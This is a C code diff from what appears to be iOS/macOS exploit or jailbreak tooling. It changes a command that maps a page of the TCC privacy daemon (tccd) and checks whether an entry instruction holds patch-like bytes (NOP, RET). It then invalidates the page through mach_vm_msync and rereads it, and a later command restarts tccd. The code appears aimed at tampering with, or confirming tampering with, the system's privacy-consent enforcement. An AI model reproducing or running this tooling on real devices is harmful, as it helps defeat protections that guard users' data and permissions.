@@ -20,17 +20,19 @@ static int control(int argc,char **argv){
  if(argc==2&&!strcmp(argv[1],"invalidate-tccd-page")){
   const char *path="/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
   int fd=open(path,O_RDONLY);if(fd<0){perror("open tccd");return 1;}
-  void *page=mmap(NULL,4096,PROT_READ|PROT_EXEC,MAP_SHARED,fd,0x31000);close(fd);
+  size_t page_bytes=(size_t)getpagesize();off_t file_offset=(off_t)(0x314acULL&~((uint64_t)page_bytes-1));size_t entry_offset=0x314acULL-(uint64_t)file_offset;
+  printf("tccd VM page=%zu file_offset=%#llx entry_offset=%#zx\n",page_bytes,(unsigned long long)file_offset,entry_offset);
+  void *page=mmap(NULL,page_bytes,PROT_READ|PROT_EXEC,MAP_SHARED,fd,file_offset);close(fd);
   if(page==MAP_FAILED){perror("map tccd page");return 1;}
-  uint32_t before=0;memcpy(&before,(char*)page+0x4ac,4);printf("tccd mapped entry before=%#x\n",before);
-  if(before!=0xd503201f&&before!=0xdac1a7fe&&before!=0xd65f03c0){puts("unexpected page bytes; no invalidation");munmap(page,4096);return 1;}
+  uint32_t before=0;memcpy(&before,(char*)page+entry_offset,4);printf("tccd mapped entry before=%#x\n",before);
+  if(before!=0xd503201f&&before!=0xdac1a7fe&&before!=0xd65f03c0){puts("unexpected page bytes; no invalidation");munmap(page,page_bytes);return 1;}
   /* Invalidate only: unlike msync(2)'s implicit synchronous mode, this
    * requests no dirty-page writeback to the sealed backing file. */
   kern_return_t(*invalidate)(mach_port_t,mach_vm_address_t,mach_vm_size_t,vm_sync_t)=(kern_return_t(*)(mach_port_t,mach_vm_address_t,mach_vm_size_t,vm_sync_t))dlsym(RTLD_DEFAULT,"mach_vm_msync");
-  if(!invalidate){puts("mach_vm_msync unavailable; no invalidation");munmap(page,4096);return 1;}
-  kern_return_t status=invalidate(mach_task_self(),(mach_vm_address_t)page,4096,VM_SYNC_INVALIDATE);
-  printf("tccd page invalidate-only kr=%d\n",status);uint32_t after=0;if(!status)memcpy(&after,(char*)page+0x4ac,4);
-  printf("tccd refaulted entry after=%#x\n",after);munmap(page,4096);return status?1:0;
+  if(!invalidate){puts("mach_vm_msync unavailable; no invalidation");munmap(page,page_bytes);return 1;}
+  kern_return_t status=invalidate(mach_task_self(),(mach_vm_address_t)page,page_bytes,VM_SYNC_INVALIDATE);
+  printf("tccd page invalidate-only kr=%d\n",status);uint32_t after=0;if(!status)memcpy(&after,(char*)page+entry_offset,4);
+  printf("tccd refaulted entry after=%#x\n",after);munmap(page,page_bytes);return status?1:0;
  }
  if(argc==2&&(!strcmp(argv[1],"kick-liveactivities")||!strcmp(argv[1],"kick-tccd"))){
   /* Verified shipped iOS27 libxpc service API. flags0: not suspended,
